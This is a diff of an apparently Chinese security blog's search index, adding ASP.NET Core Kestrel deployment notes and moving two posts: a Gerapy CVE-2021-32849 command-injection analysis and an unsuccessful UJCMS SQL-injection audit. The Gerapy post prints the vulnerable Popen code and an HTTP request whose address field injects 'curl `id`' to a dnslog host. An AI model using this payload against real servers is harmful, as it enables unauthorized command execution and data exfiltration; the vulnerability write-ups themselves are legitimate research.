@@ -33,7 +33,12 @@
 <p>一个方法要你能够被指定得委托引用  那么必须保证其 返回值以及形参个数与类型一致。<br>创建委托</p>
 <figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">委托类型    变量名     <span class="keyword">new</span>一个委托  方法名</span><br><span class="line">Calculator calc = <span class="keyword">new</span> Calculator(Add); <span class="comment">// 或直接 calc = Add;</span></span><br></pre></td></tr></table></figure>
 <p>委托的调用和方法的调用一样。<br>c# 中不能直接将方法作为参数传入到函数中，需要借助委托进行  这就没有Python或者Java方便了。</p>
-]]></content>
+<h1 id="入口"><a href="#入口" class="headerlink" title="入口"></a>入口</h1><p>Web应用指定依赖就找 Program 或者StartUp啊 </p>
+<h1 id="Kestrel部署模式"><a href="#Kestrel部署模式" class="headerlink" title="Kestrel部署模式"></a>Kestrel部署模式</h1><p>Kestrel 是 ASP.NET Core 的默认跨平台、高性能、轻量级 Web 服务器，用 C# 编写，基于 .NET 的底层 Socket 实现。<br>在 ASP.NET Core 应用部署中，Kestrel 通常不直接面向公网，而是放在 IIS、Nginx 或 Apache 等“反向代理”服务器之后。这是微软官方推荐的生产部署架构：<br>有些项目使用这种部署模式  在web.conf中可以见到这样的配置</p>
+<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="line">&lt;configuration&gt;</span><br><span class="line">  &lt;location path=<span class="string">&quot;.&quot;</span> inheritInChildApplications=<span class="string">&quot;false&quot;</span>&gt;</span><br><span class="line">    &lt;system.webServer&gt;</span><br><span class="line">      &lt;handlers&gt;</span><br><span class="line">        &lt;<span class="keyword">add</span> name=<span class="string">&quot;aspNetCore&quot;</span> path=<span class="string">&quot;*&quot;</span> verb=<span class="string">&quot;*&quot;</span> modules=<span class="string">&quot;AspNetCoreModuleV2&quot;</span> resourceType=<span class="string">&quot;Unspecified&quot;</span> /&gt;</span><br><span class="line">      &lt;/handlers&gt;</span><br><span class="line">      &lt;aspNetCore </span><br><span class="line">          processPath=<span class="string">&quot;dotnet&quot;</span> </span><br><span class="line">          arguments=<span class="string">&quot;.\YourApp.dll&quot;</span> </span><br><span class="line">          stdoutLogEnabled=<span class="string">&quot;false&quot;</span> </span><br><span class="line">          stdoutLogFile=<span class="string">&quot;.\logs\stdout&quot;</span> </span><br><span class="line">          hostingModel=<span class="string">&quot;inprocess&quot;</span> /&gt;</span><br><span class="line">    &lt;/system.webServer&gt;</span><br><span class="line">  &lt;/location&gt;</span><br><span class="line">&lt;/configuration&gt;</span><br></pre></td></tr></table></figure>
+<p>processPath 属性指定的就是启动程序 可以是默认的.net  也可以是用户自定义的一个程序<br>一般在生产模式 使用第二种方式，这个程序是系统自动生成的表示独立部署模式，在发布应用时可通过配置进行选择，所有的.net RUNTIME都被打包到应用中  不需要额外安装.net Runtime<br>这样部署生成的web代码位于另外的dll文件中 不在这个exe文件中一般通过存在的配置文件找到对应的主dll文件 如 配置文件名为 a.b.c.dll.config  那么就去找这个a.b.c.dll 反编译后直接找 Program 这个类</p>
+<p>hostingModel 标识驻守模式  inprocess 表示在w3wp.exe 内部运行 拥有更高的性能</p>
+<h1 id=""><a href="#" class="headerlink" title=""></a></h1>]]></content>
       <categories>
         <category>漏洞挖掘</category>
       </categories>
@@ -542,9 +547,9 @@
       </categories>
       <tags>
         <tag>Apache Struts2</tag>
+        <tag>任意文件上传</tag>
         <tag>s2-067</tag>
         <tag>CVE-2024-53677</tag>
-        <tag>任意文件上传</tag>
       </tags>
   </entry>
   <entry>
@@ -610,8 +615,8 @@
       <tags>
         <tag>RCE</tag>
         <tag>Apache Struts2</tag>
-        <tag>任意文件上传</tag>
         <tag>S2-066</tag>
+        <tag>任意文件上传</tag>
         <tag>CVE-2023-50164</tag>
       </tags>
   </entry>
@@ -724,8 +729,8 @@
         <category>漏洞分析</category>
       </categories>
       <tags>
-        <tag>漏洞分析</tag>
         <tag>认证绕过</tag>
+        <tag>漏洞分析</tag>
         <tag>Spring Security</tag>
         <tag>WebFlux</tag>
         <tag>CVE-2024-38821</tag>
@@ -771,8 +776,8 @@
         <category>spring</category>
       </categories>
       <tags>
-        <tag>漏洞分析</tag>
         <tag>认证绕过</tag>
+        <tag>漏洞分析</tag>
         <tag>Spring Security</tag>
         <tag>EnableMethodSecurity</tag>
         <tag>CVE-2025-22223</tag>
@@ -1291,30 +1296,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Gerapy clone 后台远程命令执行漏洞【CVE-2021-32849】</title>
-    <url>/archives/9d7d8426.html</url>
-    <content><![CDATA[<p>@[TOC](Gerapy clone 后台远程命令执行漏洞【CVE-2021-32849】)</p>
-<p>该漏洞的利用需要授权，虽然危害较大，但是感觉还是比较鸡肋的。<br>项目地址：<a href="https://github.com/Gerapy/Gerapy">Gerapy</a><br>该漏洞出现在项目的<code>gerapy/server/core/views.py</code>中的<code>project_clone</code>函数中：</p>
-<span id="more"></span>
-<p><img src="https://i-blog.csdnimg.cn/blog_migrate/9eb4aefb4396f43fdf3008db2f01d093.png" alt="在这里插入图片描述"></p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@api_view(<span class="params">[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="meta">@permission_classes(<span class="params">[IsAuthenticated]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">project_clone</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    clone project from github</span></span><br><span class="line"><span class="string">    :param request: request object</span></span><br><span class="line"><span class="string">    :return: json</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        data = json.loads(request.body)</span><br><span class="line">        address = data.get(<span class="string">&#x27;address&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> address.startswith(<span class="string">&#x27;http&#x27;</span>):</span><br><span class="line">            <span class="keyword">return</span> JsonResponse(&#123;<span class="string">&#x27;status&#x27;</span>: <span class="literal">False</span>&#125;)</span><br><span class="line">        address = address + <span class="string">&#x27;.git&#x27;</span> <span class="keyword">if</span> <span class="keyword">not</span> address.endswith(<span class="string">&#x27;.git&#x27;</span>) <span class="keyword">else</span> address</span><br><span class="line">        cmd = <span class="string">&#x27;git clone &#123;address&#125; &#123;target&#125;&#x27;</span>.<span class="built_in">format</span>(address=address, target=join(PROJECTS_FOLDER, Path(address).stem))</span><br><span class="line">        logger.debug(<span class="string">&#x27;clone cmd %s&#x27;</span>, cmd)</span><br><span class="line">        p = Popen(cmd, shell=<span class="literal">True</span>, stdin=PIPE, stdout=PIPE, stderr=PIPE)</span><br><span class="line">        stdout, stderr = bytes2str(p.stdout.read()), bytes2str(p.stderr.read())</span><br><span class="line">        logger.debug(<span class="string">&#x27;clone run result %s&#x27;</span>, stdout)</span><br><span class="line">        <span class="keyword">if</span> stderr: logger.error(stderr)</span><br><span class="line">        <span class="keyword">return</span> JsonResponse(&#123;<span class="string">&#x27;status&#x27;</span>: <span class="literal">True</span>&#125;) <span class="keyword">if</span> <span class="keyword">not</span> stderr <span class="keyword">else</span> JsonResponse(&#123;<span class="string">&#x27;status&#x27;</span>: <span class="literal">False</span>&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>注意到第339行使用了Popen函数，搜一下这个函数的作用：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/799f6635745b9e6dfc81b445ddb3b5f2.png" alt="在这里插入图片描述"></p>
-<p>说白了可以用来执行系统命令，我们来验证一下：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/5d258bd7ccdbd60712f869e1848ed6be.png" alt="在这里插入图片描述"><br>成功弹出来了计算器。<br>所以如果cmd参数可控，那么就可以用来执行系统命令，<br>cmd的赋值操作：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cmd = <span class="string">&#x27;git clone &#123;address&#125; &#123;target&#125;&#x27;</span>.<span class="built_in">format</span>(address=address, target=join(PROJECTS_FOLDER, Path(address).stem))</span><br></pre></td></tr></table></figure>
-<p>address或者target可控就可以执行命令<br>address的赋值操作：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/3fc852ebbd311913f9e1987b778fb0d7.png" alt="在这里插入图片描述"><br>观察这一串代码，首先将请求体的数据加载为python字典，然后获取其中address键的值赋值给address，同时还要满足address的值以http开头，否则就直接退出程序了。最后将address拼接.git赋值个address。从这个过程可以看到，address的值是我们完全可控的，也就意味着我们可以用来执行系统命令。</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">POST /api/project/clone HTTP/1.1</span><br><span class="line">Host: </span><br><span class="line">Content-Length: 61</span><br><span class="line">Accept: application/json, text/plain, */*</span><br><span class="line">Authorization: Token 0fb31a60728efd8e6398349bea36fa7629bd8df0</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.55 Safari/537.36</span><br><span class="line">Content-Type: application/json;charset=UTF-8</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&#123;&quot;address&quot;:&quot;http://127.0.0.1;curl `id`.rwbmny.dnslog.cn&quot;&#125;</span><br></pre></td></tr></table></figure>
-<p>访问的api信息在这儿：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/01e29197029a0735c2b4675d5678692a.png" alt="在这里插入图片描述"><br>不幸的是，这个操作需要认证，看到请求头中的Authorization标头了吗，无语凝噎：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/e8b49ac4d5289c12a97c47bd7c7b0e98.png" alt="在这里插入图片描述"><br>顺着这个思路其实还有一系列的利用链条，有兴趣的可以自行下载源码审计。</p>
-]]></content>
-      <categories>
-        <category>漏洞分析</category>
-      </categories>
-      <tags>
-        <tag>Gerapy clone</tag>
-        <tag>CVE-2021-32849</tag>
-        <tag>远程命令执行</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Fastjson反序列化漏洞TemplateImpl利用链条跟踪与分析</title>
     <url>/archives/4187a059.html</url>
     <content><![CDATA[<p>@<a href="Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9ETemplateImpl%E5%88%A9%E7%94%A8%E9%93%BE%E6%9D%A1%E8%B7%9F%E8%B8%AA%E4%B8%8E%E5%88%86%E6%9E%90">TOC</a></p>
@@ -1365,6 +1346,30 @@
         <tag>fastjson</tag>
         <tag>gadgets</tag>
         <tag>templateImpl</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Gerapy clone 后台远程命令执行漏洞【CVE-2021-32849】</title>
+    <url>/archives/9d7d8426.html</url>
+    <content><![CDATA[<p>@[TOC](Gerapy clone 后台远程命令执行漏洞【CVE-2021-32849】)</p>
+<p>该漏洞的利用需要授权，虽然危害较大，但是感觉还是比较鸡肋的。<br>项目地址：<a href="https://github.com/Gerapy/Gerapy">Gerapy</a><br>该漏洞出现在项目的<code>gerapy/server/core/views.py</code>中的<code>project_clone</code>函数中：</p>
+<span id="more"></span>
+<p><img src="https://i-blog.csdnimg.cn/blog_migrate/9eb4aefb4396f43fdf3008db2f01d093.png" alt="在这里插入图片描述"></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@api_view(<span class="params">[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="meta">@permission_classes(<span class="params">[IsAuthenticated]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">project_clone</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    clone project from github</span></span><br><span class="line"><span class="string">    :param request: request object</span></span><br><span class="line"><span class="string">    :return: json</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        data = json.loads(request.body)</span><br><span class="line">        address = data.get(<span class="string">&#x27;address&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> address.startswith(<span class="string">&#x27;http&#x27;</span>):</span><br><span class="line">            <span class="keyword">return</span> JsonResponse(&#123;<span class="string">&#x27;status&#x27;</span>: <span class="literal">False</span>&#125;)</span><br><span class="line">        address = address + <span class="string">&#x27;.git&#x27;</span> <span class="keyword">if</span> <span class="keyword">not</span> address.endswith(<span class="string">&#x27;.git&#x27;</span>) <span class="keyword">else</span> address</span><br><span class="line">        cmd = <span class="string">&#x27;git clone &#123;address&#125; &#123;target&#125;&#x27;</span>.<span class="built_in">format</span>(address=address, target=join(PROJECTS_FOLDER, Path(address).stem))</span><br><span class="line">        logger.debug(<span class="string">&#x27;clone cmd %s&#x27;</span>, cmd)</span><br><span class="line">        p = Popen(cmd, shell=<span class="literal">True</span>, stdin=PIPE, stdout=PIPE, stderr=PIPE)</span><br><span class="line">        stdout, stderr = bytes2str(p.stdout.read()), bytes2str(p.stderr.read())</span><br><span class="line">        logger.debug(<span class="string">&#x27;clone run result %s&#x27;</span>, stdout)</span><br><span class="line">        <span class="keyword">if</span> stderr: logger.error(stderr)</span><br><span class="line">        <span class="keyword">return</span> JsonResponse(&#123;<span class="string">&#x27;status&#x27;</span>: <span class="literal">True</span>&#125;) <span class="keyword">if</span> <span class="keyword">not</span> stderr <span class="keyword">else</span> JsonResponse(&#123;<span class="string">&#x27;status&#x27;</span>: <span class="literal">False</span>&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>注意到第339行使用了Popen函数，搜一下这个函数的作用：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/799f6635745b9e6dfc81b445ddb3b5f2.png" alt="在这里插入图片描述"></p>
+<p>说白了可以用来执行系统命令，我们来验证一下：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/5d258bd7ccdbd60712f869e1848ed6be.png" alt="在这里插入图片描述"><br>成功弹出来了计算器。<br>所以如果cmd参数可控，那么就可以用来执行系统命令，<br>cmd的赋值操作：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cmd = <span class="string">&#x27;git clone &#123;address&#125; &#123;target&#125;&#x27;</span>.<span class="built_in">format</span>(address=address, target=join(PROJECTS_FOLDER, Path(address).stem))</span><br></pre></td></tr></table></figure>
+<p>address或者target可控就可以执行命令<br>address的赋值操作：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/3fc852ebbd311913f9e1987b778fb0d7.png" alt="在这里插入图片描述"><br>观察这一串代码，首先将请求体的数据加载为python字典，然后获取其中address键的值赋值给address，同时还要满足address的值以http开头，否则就直接退出程序了。最后将address拼接.git赋值个address。从这个过程可以看到，address的值是我们完全可控的，也就意味着我们可以用来执行系统命令。</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">POST /api/project/clone HTTP/1.1</span><br><span class="line">Host: </span><br><span class="line">Content-Length: 61</span><br><span class="line">Accept: application/json, text/plain, */*</span><br><span class="line">Authorization: Token 0fb31a60728efd8e6398349bea36fa7629bd8df0</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.55 Safari/537.36</span><br><span class="line">Content-Type: application/json;charset=UTF-8</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&#123;&quot;address&quot;:&quot;http://127.0.0.1;curl `id`.rwbmny.dnslog.cn&quot;&#125;</span><br></pre></td></tr></table></figure>
+<p>访问的api信息在这儿：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/01e29197029a0735c2b4675d5678692a.png" alt="在这里插入图片描述"><br>不幸的是，这个操作需要认证，看到请求头中的Authorization标头了吗，无语凝噎：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/e8b49ac4d5289c12a97c47bd7c7b0e98.png" alt="在这里插入图片描述"><br>顺着这个思路其实还有一系列的利用链条，有兴趣的可以自行下载源码审计。</p>
+]]></content>
+      <categories>
+        <category>漏洞分析</category>
+      </categories>
+      <tags>
+        <tag>Gerapy clone</tag>
+        <tag>CVE-2021-32849</tag>
+        <tag>远程命令执行</tag>
       </tags>
   </entry>
   <entry>
@@ -1750,6 +1755,21 @@ sun.misc.ProxyGenerator#generateProxyClass(java.lang.String, java.lang.Class<?>[
       </tags>
   </entry>
   <entry>
+    <title>一次失败的JAVA代码审计-SQL注入</title>
+    <url>/archives/b8d90c0d.html</url>
+    <content><![CDATA[<p>本次审计的CMS系统为UJCMS最新版。立足于我现在的审计水平暂时是没有发现该系统的漏洞的，拉胯。本来今天晚上跟一个SQL注入的点跟的本来都要大功告成了，结果被当头棒喝，学会了什么叫人生的参差。废话不多说直接开干。<br>直接在整个项目中搜索关键字 <code>order by $&#123;</code><br><img src="https://i-blog.csdnimg.cn/blog_migrate/82739f44b0d9fd7572daa223c583c0be.png" alt="在这里插入图片描述"><br>那么如果这个<code>queryInfo.orderBy</code>可控的话就皆大欢喜了，目前来看有很大机会<br><img src="https://i-blog.csdnimg.cn/blog_migrate/46b91c4c867dea6874e9f5b174651dd2.png" alt="在这里插入图片描述"><br>这里注意到order by 是在一条id为<code>Select_ALL</code>的语句中，对应的<code>mybatis</code>文件名为<code>SeqMapper.xml</code>，最开始的时候我就去找对应名称的<code>DAO</code>层实现类，结果一直没有找到。最后迫不得已直接来了个全局搜索<br><img src="https://i-blog.csdnimg.cn/blog_migrate/254a328e59662d472abdba7abd98d13f.png" alt="在这里插入图片描述"><br>注意到<code>Select_ALL</code>出现在其他的<code>mybatis</code>映射文件的<code>include</code> 标签里，这个标签就和php里的include或者require一个功能，用作代码复用。那么我们随便进入一个<code>mapper.xml</code>，这里以<code>Article.mapper</code>为例。<br><img src="https://i-blog.csdnimg.cn/blog_migrate/82b1150a5d9c2d9bc9318d3b99103b37.png" alt="在这里插入图片描述"><br>这里的sql语句id为<code>selectAll</code>，返回值类型为<code>ResultMap</code>，然后找到对应的<code>DAO</code>层实现类<br><img src="https://i-blog.csdnimg.cn/blog_migrate/4ab6fbb786f6ba96f10eb785e26d3065.png" alt="在这里插入图片描述"><br>注意到这里是个接口而不是实现类，这是因为<code>@Mapper  @Repository</code> 这两个注解的功劳@Mapper可以使接口在编译时自动生成器实现类，@Repositry注解帮助实现自动注入。然后就是取找对应的<code>Services</code>层，这里也是去找对应文件名，不出意外是<code>ArticleService.java</code><br><img src="https://i-blog.csdnimg.cn/blog_migrate/8f4a52e3de92113b3c20724aa72956ae.png" alt="在这里插入图片描述"><br>看到这里注入了<code>AticleMapper</code>，然后在在当前文件搜索哪里调用了<code>selectAll</code>方法<br><img src="https://i-blog.csdnimg.cn/blog_migrate/518c76667202e3f11ddd6ca906bff8e8.png" alt="在这里插入图片描述"><br>然后就是找对应的控制器<br><img src="https://i-blog.csdnimg.cn/blog_migrate/e1897c2399c77c6629719e39e9d52bf5.png" alt="在这里插入图片描述"><br>这么多，根据命名的规则，我们直接进入<code>ArticleController</code><br><img src="https://i-blog.csdnimg.cn/blog_migrate/1ee837af9def4c318f55e9699ea9b466.png" alt="在这里插入图片描述"><br>然后搜索有没有调用<code>AritcleService.selectAll</code>方法的语句，一搜，啪，没有咋整，不要换，在回去<code>ArticleService</code>里面看看有没有类本地的调用<br><img src="https://i-blog.csdnimg.cn/blog_migrate/718dab1f95329a3b947da5e612dda9c8.png" alt="在这里插入图片描述"><br><code>selectList</code>方法调用了，再回到<code>ArticleController</code>看看有没有调用<code>selectList</code>方法<br><img src="https://i-blog.csdnimg.cn/blog_migrate/99ef6f21f07c0a3b05bf5d4b44cbbc79.png" alt="在这里插入图片描述"><br>这儿调用了，对应的路由为<code>/api/article</code><br>然后就是看参数是否可控了，这里我么你可以控制的参数有三个，分别是<code>params,queryMap,customsQueryMap</code><br>看看这三个参数怎么来的，跟到对应的query函数<br><img src="https://i-blog.csdnimg.cn/blog_migrate/bbf42a23df56077d010c3608e991ad8e.png" alt="在这里插入图片描述"><br>在<code>query</code>函数中为上述三个参数赋值，<code>params</code>来自客户端传的参，<code>queryMap</code>与<code>customsMap</code>同样来自于客户端传的参，不过有要求，参数中前缀为<code>Q_</code>的参数会被添加到<code>queryMap</code>，前缀为<code>custom</code>的参数会被添加到<code>customsMap</code>中，然后调用<code>ArticleListDirective.assemble</code>对<code>queryMap</code>参数进行处理，跟进去看看<br>该函数前面都不重要，直到最后一条语句<br><img src="https://i-blog.csdnimg.cn/blog_migrate/714c1936bd2e7b019ab31c6801599133.png" alt="在这里插入图片描述"><br>这里就有处理<code>orderBy</code>了，注意到有一个默认值，如果搞不好就得使用这个默认值，我们当然是不想的。<br><img src="https://i-blog.csdnimg.cn/blog_migrate/e487e7b309c50c8a857d125af9804d8f.png" alt="在这里插入图片描述"><br>调用<code>getString</code>函数进行处理，然后把结果添加到<code>queryMap</code>中，跟进<code>getString</code><br><img src="https://i-blog.csdnimg.cn/blog_migrate/4335735042134ca1845e7eadff1f535b.png" alt="在这里插入图片描述"><br>重点来了，敲黑板，要考，注意到如果value为空则使用默认值，不为空则使用从param中获取的值，简直皆大欢喜啊。。。。<br>这时候我们只需要传参<code>orderBy=xxxx</code>就可以控制value的值了，简直完美，然后接着往下走。接下来queryMap会被传入到<code>selectList</code>函数<br><img src="https://i-blog.csdnimg.cn/blog_migrate/afb5e6d4b004c18036df1cfa52cb0846.png" alt="在这里插入图片描述"><br>然后传入<code>selectAll</code> 然后mybatis从queryInfo中获取到orderBy的值，然后拼接到sql语句中，注入完成，于是我就试了下，然后就报错了。。。。。<br><img src="https://i-blog.csdnimg.cn/blog_migrate/6ed045dfdeee0302e085577626fa6481.png" alt="在这里插入图片描述"></p>
+<p>哦豁，白名单，完蛋。到这里基本上就失败了，不过我们还要去看一看怎么拦的，这里报错注意到是在<code>QueryParser</code>解析的时候限制了白名单，最后定位到这里<br><img src="https://i-blog.csdnimg.cn/blog_migrate/791ada2e53ee84118d82feb21c5eb9b0.png" alt="在这里插入图片描述"><br>跟进去<br><img src="https://i-blog.csdnimg.cn/blog_migrate/3768c9c3ce96f2e60702fe9c3fe0c8dd.png" alt="在这里插入图片描述"><br>继续到parse函数最后一行<br><img src="https://i-blog.csdnimg.cn/blog_migrate/4e6fda6669c7b46c6f08dfdf4aebf804.png" alt="在这里插入图片描述"><br>跟进<code>parseOrderBy</code><br><img src="https://i-blog.csdnimg.cn/blog_migrate/99806a2b16e0e7ea3777e19f7029ae2f.png" alt="在这里插入图片描述"><br>他妈的，我一眼就注意到这里的<code>preventInjection</code>，进去看看<br><img src="https://i-blog.csdnimg.cn/blog_migrate/aa41d49a6862016da9fcd45c4a4784b8.png" alt="在这里插入图片描述"><br>。。。。根源在这里</p>
+]]></content>
+      <categories>
+        <category>漏洞分析</category>
+        <category>代码审计</category>
+      </categories>
+      <tags>
+        <tag>代码审计</tag>
+        <tag>SQL注入</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>从Wireshark抓取HTTPS流量到HTTP2协议</title>
     <url>/archives/e8476a7d.html</url>
     <content><![CDATA[<h1 id="吹水"><a href="#吹水" class="headerlink" title="吹水"></a>吹水</h1><p>打工人今天正无聊在小蓝鸟上看看国外的大哥们最近有没有又搞什么大动作，突然看到一条推文介绍使用wireshark抓取https报文的方法，正好前段时间也在公众号看到了一篇文章教这个，当时配置好了但没有去实际验证过好使不，于是趁着上班时间不验证白不验证，我这不是划水，我这是在打造生产工具，为下一步提升生产力打下良好的基础。<br>配置其实相对来说还是很简单的，首先是需要设置一下环境变量增加一项SSLKEYLOGFILE指向一个文本文件就好了，这样谷歌或者火狐浏览器在运行的时候就会将每次https会话的加密秘钥存储在这个文件里面，然后再wireshark中配置一下TLS协议的认证文件也指向这个文件就ok了，当然这个原理是我自己理解的，不过想来也就八九不离十了。想要知道详情的可以参看下面两篇文章咯</p>
@@ -1878,21 +1898,6 @@ sun.misc.ProxyGenerator#generateProxyClass(java.lang.String, java.lang.Class<?>[
         <tag>wireshark</tag>
         <tag>https</tag>
         <tag>http2</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>一次失败的JAVA代码审计-SQL注入</title>
-    <url>/archives/b8d90c0d.html</url>
-    <content><![CDATA[<p>本次审计的CMS系统为UJCMS最新版。立足于我现在的审计水平暂时是没有发现该系统的漏洞的，拉胯。本来今天晚上跟一个SQL注入的点跟的本来都要大功告成了，结果被当头棒喝，学会了什么叫人生的参差。废话不多说直接开干。<br>直接在整个项目中搜索关键字 <code>order by $&#123;</code><br><img src="https://i-blog.csdnimg.cn/blog_migrate/82739f44b0d9fd7572daa223c583c0be.png" alt="在这里插入图片描述"><br>那么如果这个<code>queryInfo.orderBy</code>可控的话就皆大欢喜了，目前来看有很大机会<br><img src="https://i-blog.csdnimg.cn/blog_migrate/46b91c4c867dea6874e9f5b174651dd2.png" alt="在这里插入图片描述"><br>这里注意到order by 是在一条id为<code>Select_ALL</code>的语句中，对应的<code>mybatis</code>文件名为<code>SeqMapper.xml</code>，最开始的时候我就去找对应名称的<code>DAO</code>层实现类，结果一直没有找到。最后迫不得已直接来了个全局搜索<br><img src="https://i-blog.csdnimg.cn/blog_migrate/254a328e59662d472abdba7abd98d13f.png" alt="在这里插入图片描述"><br>注意到<code>Select_ALL</code>出现在其他的<code>mybatis</code>映射文件的<code>include</code> 标签里，这个标签就和php里的include或者require一个功能，用作代码复用。那么我们随便进入一个<code>mapper.xml</code>，这里以<code>Article.mapper</code>为例。<br><img src="https://i-blog.csdnimg.cn/blog_migrate/82b1150a5d9c2d9bc9318d3b99103b37.png" alt="在这里插入图片描述"><br>这里的sql语句id为<code>selectAll</code>，返回值类型为<code>ResultMap</code>，然后找到对应的<code>DAO</code>层实现类<br><img src="https://i-blog.csdnimg.cn/blog_migrate/4ab6fbb786f6ba96f10eb785e26d3065.png" alt="在这里插入图片描述"><br>注意到这里是个接口而不是实现类，这是因为<code>@Mapper  @Repository</code> 这两个注解的功劳@Mapper可以使接口在编译时自动生成器实现类，@Repositry注解帮助实现自动注入。然后就是取找对应的<code>Services</code>层，这里也是去找对应文件名，不出意外是<code>ArticleService.java</code><br><img src="https://i-blog.csdnimg.cn/blog_migrate/8f4a52e3de92113b3c20724aa72956ae.png" alt="在这里插入图片描述"><br>看到这里注入了<code>AticleMapper</code>，然后在在当前文件搜索哪里调用了<code>selectAll</code>方法<br><img src="https://i-blog.csdnimg.cn/blog_migrate/518c76667202e3f11ddd6ca906bff8e8.png" alt="在这里插入图片描述"><br>然后就是找对应的控制器<br><img src="https://i-blog.csdnimg.cn/blog_migrate/e1897c2399c77c6629719e39e9d52bf5.png" alt="在这里插入图片描述"><br>这么多，根据命名的规则，我们直接进入<code>ArticleController</code><br><img src="https://i-blog.csdnimg.cn/blog_migrate/1ee837af9def4c318f55e9699ea9b466.png" alt="在这里插入图片描述"><br>然后搜索有没有调用<code>AritcleService.selectAll</code>方法的语句，一搜，啪，没有咋整，不要换，在回去<code>ArticleService</code>里面看看有没有类本地的调用<br><img src="https://i-blog.csdnimg.cn/blog_migrate/718dab1f95329a3b947da5e612dda9c8.png" alt="在这里插入图片描述"><br><code>selectList</code>方法调用了，再回到<code>ArticleController</code>看看有没有调用<code>selectList</code>方法<br><img src="https://i-blog.csdnimg.cn/blog_migrate/99ef6f21f07c0a3b05bf5d4b44cbbc79.png" alt="在这里插入图片描述"><br>这儿调用了，对应的路由为<code>/api/article</code><br>然后就是看参数是否可控了，这里我么你可以控制的参数有三个，分别是<code>params,queryMap,customsQueryMap</code><br>看看这三个参数怎么来的，跟到对应的query函数<br><img src="https://i-blog.csdnimg.cn/blog_migrate/bbf42a23df56077d010c3608e991ad8e.png" alt="在这里插入图片描述"><br>在<code>query</code>函数中为上述三个参数赋值，<code>params</code>来自客户端传的参，<code>queryMap</code>与<code>customsMap</code>同样来自于客户端传的参，不过有要求，参数中前缀为<code>Q_</code>的参数会被添加到<code>queryMap</code>，前缀为<code>custom</code>的参数会被添加到<code>customsMap</code>中，然后调用<code>ArticleListDirective.assemble</code>对<code>queryMap</code>参数进行处理，跟进去看看<br>该函数前面都不重要，直到最后一条语句<br><img src="https://i-blog.csdnimg.cn/blog_migrate/714c1936bd2e7b019ab31c6801599133.png" alt="在这里插入图片描述"><br>这里就有处理<code>orderBy</code>了，注意到有一个默认值，如果搞不好就得使用这个默认值，我们当然是不想的。<br><img src="https://i-blog.csdnimg.cn/blog_migrate/e487e7b309c50c8a857d125af9804d8f.png" alt="在这里插入图片描述"><br>调用<code>getString</code>函数进行处理，然后把结果添加到<code>queryMap</code>中，跟进<code>getString</code><br><img src="https://i-blog.csdnimg.cn/blog_migrate/4335735042134ca1845e7eadff1f535b.png" alt="在这里插入图片描述"><br>重点来了，敲黑板，要考，注意到如果value为空则使用默认值，不为空则使用从param中获取的值，简直皆大欢喜啊。。。。<br>这时候我们只需要传参<code>orderBy=xxxx</code>就可以控制value的值了，简直完美，然后接着往下走。接下来queryMap会被传入到<code>selectList</code>函数<br><img src="https://i-blog.csdnimg.cn/blog_migrate/afb5e6d4b004c18036df1cfa52cb0846.png" alt="在这里插入图片描述"><br>然后传入<code>selectAll</code> 